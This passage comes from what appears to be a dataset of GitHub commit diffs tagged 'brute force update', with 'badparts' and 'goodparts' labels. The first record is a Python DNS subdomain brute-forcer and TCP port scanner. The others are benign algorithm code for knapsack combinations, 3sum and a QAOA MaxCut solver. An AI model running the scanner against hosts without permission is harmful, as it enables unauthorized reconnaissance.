\u2588\u2588\u2591\u2591\u250c\u2518\u2584\u2584\u2584\u2584\u2584\u2591\u2591\u2591\u2591\u2591\u2584\u2584\u2584\u2584\u2584\u2514\u2510\u2591\u2591\u2588\u2588 \\n'\n              '        \u2588\u2588\u258c\u2591\u2502\u2588\u2588\u2588\u2588\u2588\u2588\u258c\u2591\u2591\u2591\u2590\u2588\u2588\u2588\u2588\u2588\u2588\u2502\u2591\u2590\u2588\u2588 \\n'\n              '        \u2588\u2588\u2588\u2591\u2502\u2590\u2588\u2588\u2588\u2580\u2580\u2591\u2591\u2584\u2591\u2591\u2580\u2580\u2588\u2588\u2588\u258c\u2502\u2591\u2588\u2588\u2588 \\n'\n              '        \u2588\u2588\u2580\u2500\u2518\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2590\u2588\u258c\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2514\u2500\u2580\u2588\u2588 \\n'\n              '        \u2588\u2588\u2584\u2591\u2591\u2591\u2584\u2584\u2584\u2593\u2591\u2591\u2580\u2588\u2580\u2591\u2591\u2593\u2584\u2584\u2584\u2591\u2591\u2591\u2584\u2588\u2588\\n'\n              '        \u2588\u2588\u2588\u2588\u2584\u2500\u2518\u2588\u2588\u258c\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2590\u2588\u2588\u2514\u2500\u2584\u2588\u2588\u2588\u2588\\n'\n              '        \u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2590\u2588\u2500\u252c\u252c\u252c\u252c\u252c\u252c\u252c\u2500\u2588\u258c\u2591\u2591\u2588\u2588\u2588\u2588\u2588\\n'\n              '        \u2588\u2588\u2588\u2588\u258c\u2591\u2591\u2591\u2580\u252c\u253c\u253c\u253c\u253c\u253c\u253c\u253c\u252c\u2580\u2591\u2591\u2591\u2590\u2588\u2588\u2588\u2588 \\n'\n              '        \u2588\u2588\u2588\u2588\u2588\u2584\u2591\u2591\u2591\u2514\u2534\u2534\u2534\u2534\u2534\u2534\u2534\u2518\u2591\u2591\u2591\u2584\u2588\u2588\u2588\u2588\u2588 \\n'\n              '        \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\\n')\n        self.method = input(\"Choose the mode:\\n\"\n                            \"[1] Default list\\n\"\n                            \"[2] Brute-Force with file.txt\\n\"\n                            \"[3] Port Scanner\\n\"\n                            \">> \")\n        while self.method not in [\"1\",\"2\",\"3\"]:\n            print(\"[!] Method not found!\")\n            self.method = input(\"\\nChoose the mode:\\n\"\n                                \"[1] Default list\\n\"\n                                \"[2] Brute-Force with file.txt\\n\"\n                                \"[3] Port Scanner\\n\"\n                                \">> \")\n        if self.method == \"1\":\n            self.host_function()\n            self.dns_default_bruteforce()\n        elif self.method == \"2\":\n            self.file_function()\n            self.host_function()\n            self.dns_bruteforce_wordlist()\n        elif self.method == \"3\":\n            self.port_scanner()\n        elif self.method == \"4\":\n            sys.exit()\n    def file_function(self):\n        self.filelocation = input(\"File name: \")\n        while self.filelocation[-4:] != '.txt' or os.path.exists(self.filelocation) != True:\n            print(\"[!] Invalid file name: \")\n            self.filelocation = input(\"File name: \")\n    def host_function(self):\n        self.host = input(\"Host: \")\n        try:\n            if self.host.replace('.', '').isdigit():\n                self.host = socket.gethostbyaddr(self.host)\n            else:\n                if \"www.\" in self.host:\n                    self.host = self.host[4:]\n                    pass\n                if \".com\" not in self.host:\n                    self.host = self.host + \".com\"\n                    pass\n            print(f\"Host Ip: {socket.gethostbyname(self.host)}\")\n        except socket.herror:\n            print(\"[!] HOST NOT FOUND \")\n            sys.exit()\n        except socket.gaierror:\n            print(\"[!] HOST NOT FOUND OR CORRUPTED HOST\")\n            sys.exit()\n    def dns_default_bruteforce(self):\n        for subdomain in self._Methods__subdomains:\n            dns = subdomain + \".\" + self.host\n            try:\n                print(f\"{dns} : {socket.gethostbyname(dns)}\")\n            except socket.herror:\n                pass\n            except socket.gaierror:\n                pass\n    def dns_bruteforce_wordlist(self):\n        try:\n            self.subdomainwordlistfile = open(self.filelocation, 'r')\n            self.subdomainwordlist = self.subdomainwordlistfile.read().strip().split()\n            for item in self.subdomainwordlist:\n                dns = item + \".\" + self.host\n                try:\n                    print(f'{dns} : {socket.gethostbyname(dns)}')\n                except socket.herror:\n                    pass\n                except socket.gaierror:\n                    pass\n        except FileNotFoundError:\n            print(\"[!] FILE NOT FOUND [!]\")\n    def port_scanner(self):\n        self.host = input(\"Host: \")\n        if \"www.\" in self.host:\n            self.host = self.host[4:]\n            pass\n        for port in self._Methods__ports:\n            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            code = client.connect_ex((self.host,port))\n            if code == 0:\n                try:\n                    print(f\" {port} OPEN\")\n                except socket.gaierror:\n                    pass\ndnsbruteforce = Methods()\ndnsbruteforce.main()\n"}},"msg":"Update dns-brute-force.py"}},"https:\/\/github.com\/ydjabela\/Projet_7_OpenClasrooms":{"2b8922d6e6618cd2c3032cfd2130eca14e6c420d":{"url":"https:\/\/api.github.com\/repos\/ydjabela\/Projet_7_OpenClasrooms\/commits\/2b8922d6e6618cd2c3032cfd2130eca14e6c420d","html_url":"https:\/\/github.com\/ydjabela\/Projet_7_OpenClasrooms\/commit\/2b8922d6e6618cd2c3032cfd2130eca14e6c420d","message":"update brute force and creat optimized file","sha":"2b8922d6e6618cd2c3032cfd2130eca14e6c420d","keyword":"brute force update","diff":"diff --git a\/controller\/__pycache__\/bruteforce.cpython-37.pyc b\/controller\/__pycache__\/bruteforce.cpython-37.pyc\nindex b7b22a0..3534777 100644\nBinary files a\/controller\/__pycache__\/bruteforce.cpython-37.pyc and b\/controller\/__pycache__\/bruteforce.cpython-37.pyc differ\ndiff --git a\/controller\/bruteforce.py b\/controller\/bruteforce.py\nindex 987d4d3..9c2cf0a 100644\n--- a\/controller\/bruteforce.py\n+++ b\/controller\/bruteforce.py\n@@ -30,18 +30,18 @@ def menu(self):\n         benefits_list = list()\n         for i in range(len(select_table)):\n             benefits_list.append(select_table[i][\"benefits\"])\n-        i = list()\n-        for j in range(0, 20):\n-            i.append(j)\n+        actions = list()\n+        for j in range(0, len(select_table)):\n+            actions.append(j)\n         comb = []\n-        for n in range(1, len(i)+1):\n-            comb.append([i for i in combinations(i, n)])\n+        for n in range(1, len(actions)+1):\n+            comb.append([i for i in combinations(actions, n)])\n         serialized = dict()\n         i = 1\n         for comm in comb:\n             for x in comm:\n                 total_costs = self.total_cost(select_table=select_table, select_action_id=x)\n-                if total_costs >= 500:\n+                if total_costs > 500:\n                     pass\n                 else:\n                     total_binef = self.total_benifits(select_table=select_table, select_action_id=x)\ndiff --git a\/controller\/optimized.py b\/controller\/optimized.py\nnew file mode 100644\nindex 0000000..e69de29\n","files":{"\/controller\/bruteforce.py":{"changes":[{"diff":"\n         benefits_list = list()\n         for i in range(len(select_table)):\n             benefits_list.append(select_table[i][\"benefits\"])\n-        i = list()\n-        for j in range(0, 20):\n-            i.append(j)\n+        actions = list()\n+        for j in range(0, len(select_table)):\n+            actions.append(j)\n         comb = []\n-        for n in range(1, len(i)+1):\n-            comb.append([i for i in combinations(i, n)])\n+        for n in range(1, len(actions)+1):\n+            comb.append([i for i in combinations(actions, n)])\n         serialized = dict()\n         i = 1\n         for comm in comb:\n             for x in comm:\n                 total_costs = self.total_cost(select_table=select_table, select_action_id=x)\n-                if total_costs >= 500:\n+                if total_costs > 500:\n                     pass\n                 else:\n                     total_binef = self.total_benifits(select_table=select_table, select_action_id=x","add":6,"remove":6,"filename":"\/controller\/bruteforce.py","badparts":["        i = list()","        for j in range(0, 20):","            i.append(j)","        for n in range(1, len(i)+1):","            comb.append([i for i in combinations(i, n)])","                if total_costs >= 500:"],"goodparts":["        actions = list()","        for j in range(0, len(select_table)):","            actions.append(j)","        for n in range(1, len(actions)+1):","            comb.append([i for i in combinations(actions, n)])","                if total_costs > 500:"]}],"source":"\nfrom model.database_actions import Database from itertools import combinations class MainMenu(Database): def total_benifits(self, select_table, select_action_id): total_binef=0 for i in select_action_id: total_binef +=select_table[i][\"benefits\"] return total_binef def total_cost(self, select_table, select_action_id): total_cst=0 for i in select_action_id: total_cst +=float(select_table[i][\"cost\"]) return total_cst def menu(self): select_table, table=self.database_action(table=\"Actions_details\") benefits_list=list() for i in range(len(select_table)): benefits_list.append(select_table[i][\"benefits\"]) i=list() for j in range(0, 20): i.append(j) comb=[] for n in range(1, len(i)+1): comb.append([i for i in combinations(i, n)]) serialized=dict() i=1 for comm in comb: for x in comm: total_costs=self.total_cost(select_table=select_table, select_action_id=x) if total_costs >=500: pass else: total_binef=self.total_benifits(select_table=select_table, select_action_id=x) serialized[i]={ 'combinaison': str(x), 'total_cost': total_costs, 'total_binef': total_binef } i +=1 max_key=max(serialized, key=lambda key: serialized[key][\"total_binef\"]) print() print(serialized[max_key]) self.update_database(table=\"result_details\", serialized=serialized[max_key]) ","sourceWithComments":"from model.database_actions import Database\nfrom itertools import combinations\n\n\nclass MainMenu(Database):\n\n    #  ----------------------------------------------------------------------------------------------------------------#\n\n    def total_benifits(self, select_table, select_action_id):\n        total_binef = 0\n        for i in select_action_id:\n            total_binef += select_table[i][\"benefits\"]\n        return total_binef\n\n    #  ----------------------------------------------------------------------------------------------------------------#\n\n    def total_cost(self, select_table, select_action_id):\n        total_cst = 0\n        for i in select_action_id:\n            total_cst += float(select_table[i][\"cost\"])\n        return total_cst\n\n    #  ----------------------------------------------------------------------------------------------------------------#\n\n    def menu(self):\n        # init\n        # update benifts\n        # self.update_database(table=\"Actions_details\")\n        select_table, table = self.database_action(table=\"Actions_details\")\n        benefits_list = list()\n        for i in range(len(select_table)):\n            benefits_list.append(select_table[i][\"benefits\"])\n        i = list()\n        for j in range(0, 20):\n            i.append(j)\n        comb = []\n        for n in range(1, len(i)+1):\n            comb.append([i for i in combinations(i, n)])\n        serialized = dict()\n        i = 1\n        for comm in comb:\n            for x in comm:\n                total_costs = self.total_cost(select_table=select_table, select_action_id=x)\n                if total_costs >= 500:\n                    pass\n                else:\n                    total_binef = self.total_benifits(select_table=select_table, select_action_id=x)\n                    serialized[i] = {\n                        'combinaison': str(x),\n                        'total_cost': total_costs,\n                        'total_binef': total_binef\n                    }\n                    i += 1\n        max_key = max(serialized, key=lambda key: serialized[key][\"total_binef\"])\n        print()\n        print(serialized[max_key])\n        self.update_database(table=\"result_details\", serialized=serialized[max_key])\n\n#   -------------------------------------------------------------------------------------------------------------------#\n"}},"msg":"update brute force and creat optimized file"}},"https:\/\/github.com\/wschoi89\/leetcode":{"524697a5ad5f8d75da45d1699c9243d5d0e8938a":{"url":"https:\/\/api.github.com\/repos\/wschoi89\/leetcode\/commits\/524697a5ad5f8d75da45d1699c9243d5d0e8938a","html_url":"https:\/\/github.com\/wschoi89\/leetcode\/commit\/524697a5ad5f8d75da45d1699c9243d5d0e8938a","message":"Update 15.3sum.py\n\n- brute force \uc544\ub2cc two pointer \uc774\uc6a9\ud55c \ubc29\ubc95\n- review \ud544\uc694","sha":"524697a5ad5f8d75da45d1699c9243d5d0e8938a","keyword":"brute force update","diff":"diff --git a\/15.3sum.py b\/15.3sum.py\nindex 77ef1c9..3f45b6e 100644\n--- a\/15.3sum.py\n+++ b\/15.3sum.py\n@@ -1,18 +1,50 @@\n \n-# nums = [-1, 0, 1, 2, -1, 4]\n+nums = [-1, 0, 1, 2, -1, -4]\n # nums = [0, 1, 1]\n-nums = [0, 0, 0]\n+# nums = [0, 0, 0]\n \n \n+results = []\n nums.sort()\n \n print(nums)\n \n result = []\n+\n for i in range(0, len(nums)-2):\n-    for j in range(i+1, len(nums)-1):\n-        for k in range(j+1, len(nums)):\n-            if nums[i]+nums[j]+nums[k] == 0 and not [nums[i], nums[j], nums[k]] in result:\n-                result.append([nums[i], nums[j], nums[k]])\n \n-print('result: ', result)\n+\n+    if i>0 and nums[i] == nums[i-1]:\n+        continue\n+    idx_l, idx_r = i+1, len(nums)-1\n+\n+    while idx_l < idx_r:\n+        sum = nums[i] + nums[idx_l] + nums[idx_r]\n+\n+\n+        if sum < 0:\n+            idx_l += 1\n+        elif sum > 0:\n+            idx_r -= 1\n+        else:\n+            result.append([nums[i], nums[idx_l], nums[idx_r]])\n+\n+            while nums[idx_l] == nums[idx_l+1]:\n+                idx_l +=1\n+\n+            while nums[idx_r] == nums[idx_r-1]:\n+                idx_r -=1\n+\n+            idx_l += 1\n+            idx_r -= 1\n+\n+print(result)\n+\n+\n+\n+\n+\n+\n+\n+\n+\n","files":{"\/15.3sum.py":{"changes":[{"diff":"\n \n-# nums = [-1, 0, 1, 2, -1, 4]\n+nums = [-1, 0, 1, 2, -1, -4]\n # nums = [0, 1, 1]\n-nums = [0, 0, 0]\n+# nums = [0, 0, 0]\n \n \n+results = []\n nums.sort()\n \n print(nums)\n \n result = []\n+\n for i in range(0, len(nums)-2):\n-    for j in range(i+1, len(nums)-1):\n-        for k in range(j+1, len(nums)):\n-            if nums[i]+nums[j]+nums[k] == 0 and not [nums[i], nums[j], nums[k]] in result:\n-                result.append([nums[i], nums[j], nums[k]])\n \n-print('result: ', result)\n+\n+    if i>0 and nums[i] == nums[i-1]:\n+        continue\n+    idx_l, idx_r = i+1, len(nums)-1\n+\n+    while idx_l < idx_r:\n+        sum = nums[i] + nums[idx_l] + nums[idx_r]\n+\n+\n+        if sum < 0:\n+            idx_l += 1\n+        elif sum > 0:\n+            idx_r -= 1\n+        else:\n+            result.append([nums[i], nums[idx_l], nums[idx_r]])\n+\n+            while nums[idx_l] == nums[idx_l+1]:\n+                idx_l +=1\n+\n+            while nums[idx_r] == nums[idx_r-1]:\n+                idx_r -=1\n+\n+            idx_l += 1\n+            idx_r -= 1\n+\n+print(result)\n+\n+\n+\n+\n+\n+\n+\n+\n+\n","add":39,"remove":7,"filename":"\/15.3sum.py","badparts":["nums = [0, 0, 0]","    for j in range(i+1, len(nums)-1):","        for k in range(j+1, len(nums)):","            if nums[i]+nums[j]+nums[k] == 0 and not [nums[i], nums[j], nums[k]] in result:","                result.append([nums[i], nums[j], nums[k]])","print('result: ', result)"],"goodparts":["nums = [-1, 0, 1, 2, -1, -4]","results = []","    if i>0 and nums[i] == nums[i-1]:","        continue","    idx_l, idx_r = i+1, len(nums)-1","    while idx_l < idx_r:","        sum = nums[i] + nums[idx_l] + nums[idx_r]","        if sum < 0:","            idx_l += 1","        elif sum > 0:","            idx_r -= 1","        else:","            result.append([nums[i], nums[idx_l], nums[idx_r]])","            while nums[idx_l] == nums[idx_l+1]:","                idx_l +=1","            while nums[idx_r] == nums[idx_r-1]:","                idx_r -=1","            idx_l += 1","            idx_r -= 1","print(result)"]}],"source":"\n nums=[0, 0, 0] nums.sort() print(nums) result=[] for i in range(0, len(nums)-2): for j in range(i+1, len(nums)-1): for k in range(j+1, len(nums)): if nums[i]+nums[j]+nums[k]==0 and not[nums[i], nums[j], nums[k]] in result: result.append([nums[i], nums[j], nums[k]]) print('result: ', result) ","sourceWithComments":"\n# nums = [-1, 0, 1, 2, -1, 4]\n# nums = [0, 1, 1]\nnums = [0, 0, 0]\n\n\nnums.sort()\n\nprint(nums)\n\nresult = []\nfor i in range(0, len(nums)-2):\n    for j in range(i+1, len(nums)-1):\n        for k in range(j+1, len(nums)):\n            if nums[i]+nums[j]+nums[k] == 0 and not [nums[i], nums[j], nums[k]] in result:\n                result.append([nums[i], nums[j], nums[k]])\n\nprint('result: ', result)\n"}},"msg":"Update 15.3sum.py\n\n- brute force \uc544\ub2cc two pointer \uc774\uc6a9\ud55c \ubc29\ubc95\n- review \ud544\uc694"}},"https:\/\/github.com\/YZ1999\/abQAOA":{"c5c880a0bdc434a0ecef61d6021392c3c73f13c5":{"url":"https:\/\/api.github.com\/repos\/YZ1999\/abQAOA\/commits\/c5c880a0bdc434a0ecef61d6021392c3c73f13c5","html_url":"https:\/\/github.com\/YZ1999\/abQAOA\/commit\/c5c880a0bdc434a0ecef61d6021392c3c73f13c5","message":"Updated abQAOA.py, added brute force solver for MaxCut; use nshots = -1 and statevector backend to do exact simulation","sha":"c5c880a0bdc434a0ecef61d6021392c3c73f13c5","keyword":"brute force update","diff":"diff --git a\/abQAOA.py b\/abQAOA.py\nindex dadfc54..374aa0a 100644\n--- a\/abQAOA.py\n+++ b\/abQAOA.py\n@@ -3,6 +3,7 @@\n import matplotlib.pyplot as plt \n from matplotlib import cm\n from matplotlib.ticker import LinearLocator, FormatStrFormatter\n+import itertools\n \n from qiskit import Aer, IBMQ\n from qiskit import QuantumRegister, ClassicalRegister, QuantumCircuit, transpile, assemble\n@@ -12,20 +13,10 @@\n \n classical_backend = Aer.get_backend('qasm_simulator')\n \n-# # Authenticate an account and add for use during this session. Replace string argument with your private token.\n+def sample_function():\n \n-# IBMQ.enable_account('your ibm token here')\n+    # Need to use your ibm account for quantum backend\n \n-# # To store your credentials locally you can run:\n-\n-# IBMQ.save_account(\"your ibm token here\",overwrite=True)\n-\n-# my_provider = IBMQ.get_provider()\n-\n-# quantum_backend = my_provider.get_backend('ibmq_qasm_simulator')\n-\n-\n-def main():\n     # A test example, to be replaced by analysis we want to perform\n     # nx module for u3r graph generation\n     G = nx.random_regular_graph(3, 6, seed = 2)\n@@ -36,31 +27,17 @@ def main():\n     result = full_abQAOA(abQAOAfunc, G, p=5, R = 10)\n     print(f'full abQAOA result: {result}')\n         \n-    QAOAfunc = generate_QAOA_cost_from_para(G, classical_backend, nshots = 4)\n-    QAOAres = full_QAOA(QAOAfunc, G, p=5, R = 10)\n-    print(f'full QAOA result: {QAOAres}')\n-\n-\n-\n-# # Alternative way to generate graph\n-# n = 6\n-# V = np.arange(0,n,1)\n-# E =[(0,1,1.0),(0,2,1.0),(0,5,1.0), (1,2,1.0),(1,4,1.0), (2,3,1.0),(3,4,1.0),(3,5,1.0),(4,5,1.0),(5,0,1.0)] \n-\n-# G = nx.Graph()\n-# G.add_nodes_from(V)\n-# G.add_weighted_edges_from(E)\n-\n-# # Generate plot of the Graph\n-# colors       = ['r' for node in G.nodes()]\n-# default_axes = plt.axes(frameon=True)\n-# pos          = nx.circular_layout(G)\n-\n-# nx.draw_networkx(G, node_color=colors, node_size=600, alpha=1, ax=default_axes, pos=pos)\n-# # plt.savefig('network.jpg')\n+    \n+    # A simple test \n \n+    # abQAOAfunc = generate_abQAOA_cost_from_para(G, quantum_backend, nshots = 64)\n+    # abQAOAres = full_abQAOA(abQAOAfunc, G, p = 1, R = 10)\n+    # print(f'full abQAOA result: {abQAOAres}')\n+        \n+    # QAOAfunc = generate_QAOA_cost_from_para(G, quantum_backend, nshots = 4)\n+    # QAOAres = full_QAOA(QAOAfunc, G, p=2, R = 10)\n+    # print(f'full QAOA result: {QAOAres}')\n \n-# ## generate circuit\n \n def fourier(uv):\n     \n@@ -289,7 +266,7 @@ def Cloning(li1):\n \n # func = generate_cost_from_para(G, para, backend)\n \n-def Adam_abQAOA(func, initial_para, G, p, alpha=0.001, beta1=0.9, beta2=0.999, epsilon = 1e-8):\n+def Adam_abQAOA(func, initial_para, G, p, alpha=0.001, beta1=0.9, beta2=0.999, epsilon = 1e-8, accuracy = 1e-4, n_max = 500):\n     \"\"\"\n     Adam optimization algprithm especially written for ab-QAOA\n     \n@@ -314,6 +291,7 @@ def Adam_abQAOA(func, initial_para, G, p, alpha=0.001, beta1=0.9, beta2=0.999, e\n     h = initial_para[2*p:] \n #     print(len(h))\n     nqubits = len(G.nodes())\n+    # We do not need to know the energy. We set it to a value that will not converge\n     E_prev = -nqubits\n     para = Cloning(initial_para)\n     # theta = [beta, gamma] = para[0:2*p - 1]\n@@ -328,7 +306,7 @@ def Adam_abQAOA(func, initial_para, G, p, alpha=0.001, beta1=0.9, beta2=0.999, e\n \n #         print(E)\n         # Set max n of ite to 500 here\n-        if (abs(E - E_prev) < 1e-6 or t == 500):\n+        if (abs(E - E_prev) < accuracy or t == n_max):\n             break\n         g = res['grad']\n         m = beta1 * m_prev + (1 - beta1) * g\n@@ -379,7 +357,11 @@ def generate_abQAOA_cost_from_para(G, backend, nshots = 1):\n     \"\"\"\n     def execute_circ(para):\n         qc = create_abQAOA_circ(G, para)\n-        counts = backend.run(qc, shots = nshots).result().get_counts()\n+        if nshots == -1:\n+            # counts = backend.run(qc.remove_final_measurements(inplace=False)).result().get_counts()\n+            counts = backend.run(qc.remove_final_measurements(inplace=False)).result().get_counts()\n+        else:\n+            counts = backend.run(qc, shots = nshots).result().get_counts()\n         result = {}\n         result['counts'] = counts\n         result['E'] = cost_expectation(counts, G)\n@@ -405,7 +387,10 @@ def generate_QAOA_cost_from_para(G, backend, nshots = 1):\n     \"\"\"\n     def execute_circ(para):\n         qc = create_qaoa_circ(G, para)\n-        counts = backend.run(qc, shots = nshots).result().get_counts()\n+        if nshots == -1:\n+            counts = backend.run(qc.remove_final_measurements(inplace=False)).result().get_counts()\n+        else:\n+            counts = backend.run(qc, shots = nshots).result().get_counts()\n         result = {}\n         result['counts'] = counts\n         result['E'] = cost_expectation(counts, G)\n@@ -476,7 +461,7 @@ def initialize_h(nqubits, method = 'PosNegOnes'):\n         print('Please use a valid method')\n         return\n     \n-\n+# It seems that R = 1 and R =2 will result in an error\n def full_abQAOA(func, G, p, R = 10):\n     \"\"\"\n     Run full abQAOA on graph G\n@@ -702,5 +687,53 @@ def full_QAOA(func, G, p, R = 10):\n     result['cost'] = best_costs\n     return result\n \n-main()\n+# sample_function()\n+\n+def convertTuple(tup):\n+        # initialize an empty string\n+    str = ''\n+    for item in tup:\n+        str = str + item\n+    return str\n+    \n+def MaxCutSolver(G):\n+    \"\"\"\n+    Using u and v to compute beta and gamma\n+    Args:  \n+        G: the graph                \n+    Returns:\n+        result: dict with keys\n+            'states': strings of 1 and 0, possibly degenerate\n+            'cost': the best cost\n+    \"\"\"\n+\n+    opt_cost = -1\n+    states = []\n+    n_qubits = len(G.nodes())\n+\n+    all_x = list(itertools.product('01', repeat=n_qubits))\n+\n+    for x in all_x:\n+        # cost_function_C gives positive values\n+        x = convertTuple(x)\n+        cost = cost_function_C(x,G, weight = False)\n+        if cost >= opt_cost:\n+            opt_cost = cost\n+    for x in all_x:\n+        # cost_function_C gives positive values\n+        # x = convertTuple(x)\n+        cost = cost_function_C(x,G, weight = False)\n+        if cost == opt_cost:\n+            states.append(x)\n+\n+    result = {}\n+    result['states'] = states\n+    # reverse the sign to make it consistent with other parts of program\n+    result['cost'] = -opt_cost\n+\n+    return result\n+\n+\n+# Run a code script defined at beginning\n \n+# sample_function()\n\\ No newline at end of file\n","files":{"\/abQAOA.py":{"changes":[{"diff":"\n classical_backend = Aer.get_backend('qasm_simulator')\n \n-# # Authenticate an account and add for use during this session. Replace string argument with your private token.\n+def sample_function():\n \n-# IBMQ.enable_account('your ibm token here')\n+    # Need to use your ibm account for quantum backend\n \n-# # To store your credentials locally you can run:\n-\n-# IBMQ.save_account(\"your ibm token here\",overwrite=True)\n-\n-# my_provider = IBMQ.get_provider()\n-\n-# quantum_backend = my_provider.get_backend('ibmq_qasm_simulator')\n-\n-\n-def main():\n     # A test example, to be replaced by analysis we want to perform\n     # nx module for u3r graph generation\n     G = nx.random_regular_graph(3, 6, seed = 2)\n","add":2,"remove":12,"filename":"\/abQAOA.py","badparts":["def main():"],"goodparts":["def sample_function():"]},{"diff":"\n     result = full_abQAOA(abQAOAfunc, G, p=5, R = 10)\n     print(f'full abQAOA result: {result}')\n         \n-    QAOAfunc = generate_QAOA_cost_from_para(G, classical_backend, nshots = 4)\n-    QAOAres = full_QAOA(QAOAfunc, G, p=5, R = 10)\n-    print(f'full QAOA result: {QAOAres}')\n-\n-\n-\n-# # Alternative way to generate graph\n-# n = 6\n-# V = np.arange(0,n,1)\n-# E =[(0,1,1.0),(0,2,1.0),(0,5,1.0), (1,2,1.0),(1,4,1.0), (2,3,1.0),(3,4,1.0),(3,5,1.0),(4,5,1.0),(5,0,1.0)] \n-\n-# G = nx.Graph()\n-# G.add_nodes_from(V)\n-# G.add_weighted_edges_from(E)\n-\n-# # Generate plot of the Graph\n-# colors       = ['r' for node in G.nodes()]\n-# default_axes = plt.axes(frameon=True)\n-# pos          = nx.circular_layout(G)\n-\n-# nx.draw_networkx(G, node_color=colors, node_size=600, alpha=1, ax=default_axes, pos=pos)\n-# # plt.savefig('network.jpg')\n+    \n+    # A simple test \n \n+    # abQAOAfunc = generate_abQAOA_cost_from_para(G, quantum_backend, nshots = 64)\n+    # abQAOAres = full_abQAOA(abQAOAfunc, G, p = 1, R = 10)\n+    # print(f'full abQAOA result: {abQAOAres}')\n+        \n+    # QAOAfunc = generate_QAOA_cost_from_para(G, quantum_backend, nshots = 4)\n+    # QAOAres = full_QAOA(QAOAfunc, G, p=2, R = 10)\n+    # print(f'full QAOA result: {QAOAres}')\n \n-# ## generate circuit\n \n def fourier(uv):\n     \n","add":9,"remove":23,"filename":"\/abQAOA.py","badparts":["    QAOAfunc = generate_QAOA_cost_from_para(G, classical_backend, nshots = 4)","    QAOAres = full_QAOA(QAOAfunc, G, p=5, R = 10)","    print(f'full QAOA result: {QAOAres}')"],"goodparts":[]},{"diff":"\n \n # func = generate_cost_from_para(G, para, backend)\n \n-def Adam_abQAOA(func, initial_para, G, p, alpha=0.001, beta1=0.9, beta2=0.999, epsilon = 1e-8):\n+def Adam_abQAOA(func, initial_para, G, p, alpha=0.001, beta1=0.9, beta2=0.999, epsilon = 1e-8, accuracy = 1e-4, n_max = 500):\n     \"\"\"\n     Adam optimization algprithm especially written for ab-QAOA\n     \n","add":1,"remove":1,"filename":"\/abQAOA.py","badparts":["def Adam_abQAOA(func, initial_para, G, p, alpha=0.001, beta1=0.9, beta2=0.999, epsilon = 1e-8):"],"goodparts":["def Adam_abQAOA(func, initial_para, G, p, alpha=0.001, beta1=0.9, beta2=0.999, epsilon = 1e-8, accuracy = 1e-4, n_max = 500):"]},{"diff":"\n \n #         print(E)\n         # Set max n of ite to 500 here\n-        if (abs(E - E_prev) < 1e-6 or t == 500):\n+        if (abs(E - E_prev) < accuracy or t == n_max):\n             break\n         g = res['grad']\n         m = beta1 * m_prev + (1 - beta1) * g\n","add":1,"remove":1,"filename":"\/abQAOA.py","badparts":["        if (abs(E - E_prev) < 1e-6 or t == 500):"],"goodparts":["        if (abs(E - E_prev) < accuracy or t == n_max):"]},{"diff":"\n     \"\"\"\n     def execute_circ(para):\n         qc = create_abQAOA_circ(G, para)\n-        counts = backend.run(qc, shots = nshots).result().get_counts()\n+        if nshots == -1:\n+            # counts = backend.run(qc.remove_final_measurements(inplace=False)).result().get_counts()\n+            counts = backend.run(qc.remove_final_measurements(inplace=False)).result().get_counts()\n+        else:\n+            counts = backend.run(qc, shots = nshots).result().get_counts()\n         result = {}\n         result['counts'] = counts\n         result['E'] = cost_expectation(counts, G)\n","add":5,"remove":1,"filename":"\/abQAOA.py","badparts":["        counts = backend.run(qc, shots = nshots).result().get_counts()"],"goodparts":["        if nshots == -1:","            counts = backend.run(qc.remove_final_measurements(inplace=False)).result().get_counts()","        else:","            counts = backend.run(qc, shots = nshots).result().get_counts()"]},{"diff":"\n     \"\"\"\n     def execute_circ(para):\n         qc = create_qaoa_circ(G, para)\n-        counts = backend.run(qc, shots = nshots).result().get_counts()\n+        if nshots == -1:\n+            counts = backend.run(qc.remove_final_measurements(inplace=False)).result().get_counts()\n+        else:\n+            counts = backend.run(qc, shots = nshots).result().get_counts()\n         result = {}\n         result['counts'] = counts\n         result['E'] = cost_expectation(counts, G)\n","add":4,"remove":1,"filename":"\/abQAOA.py","badparts":["        counts = backend.run(qc, shots = nshots).result().get_counts()"],"goodparts":["        if nshots == -1:","            counts = backend.run(qc.remove_final_measurements(inplace=False)).result().get_counts()","        else:","            counts = backend.run(qc, shots = nshots).result().get_counts()"]},{"diff":"\n     result['cost'] = best_costs\n     return result\n \n-main()\n+# sample_function()\n+\n+def convertTuple(tup):\n+        # initialize an empty string\n+    str = ''\n+    for item in tup:\n+        str = str + item\n+    return str\n+    \n+def MaxCutSolver(G):\n+    \"\"\"\n+    Using u and v to compute beta and gamma\n+    Args:  \n+        G: the graph                \n+    Returns:\n+        result: dict with keys\n+            'states': strings of 1 and 0, possibly degenerate\n+            'cost': the best cost\n+    \"\"\"\n+\n+    opt_cost = -1\n+    states = []\n+    n_qubits = len(G.nodes())\n+\n+    all_x = list(itertools.product('01', repeat=n_qubits))\n+\n+    for x in all_x:\n+        # cost_function_C gives positive values\n+        x = convertTuple(x)\n+        cost = cost_function_C(x,G, weight = False)\n+        if cost >= opt_cost:\n+            opt_cost = cost\n+    for x in all_x:\n+        # cost_function_C gives positive values\n+        # x = convertTuple(x)\n+        cost = cost_function_C(x,G, weight = False)\n+        if cost == opt_cost:\n+            states.append(x)\n+\n+    result = {}\n+    result['states'] = states\n+    # reverse the sign to make it consistent with other parts of program\n+    result['cost'] = -opt_cost\n+\n+    return result\n+\n+\n+# Run a code script defined at beginning\n \n+# sample_function()\n\\ No newline at end of file\n","add":49,"remove":1,"filename":"\/abQAOA.py","badparts":["main()"],"goodparts":["def convertTuple(tup):","    str = ''","    for item in tup:","        str = str + item","    return str","def MaxCutSolver(G):","    \"\"\"","    Using u and v to compute beta and gamma","    Args:  ","        G: the graph                ","    Returns:","        result: dict with keys","            'states': strings of 1 and 0, possibly degenerate","            'cost': the best cost","    \"\"\"","    opt_cost = -1","    states = []","    n_qubits = len(G.nodes())","    all_x = list(itertools.product('01', repeat=n_qubits))","    for x in all_x:","        x = convertTuple(x)","        cost = cost_function_C(x,G, weight = False)","        if cost >= opt_cost:","            opt_cost = cost","    for x in all_x:","        cost = cost_function_C(x,G, weight = False)","        if cost == opt_cost:","            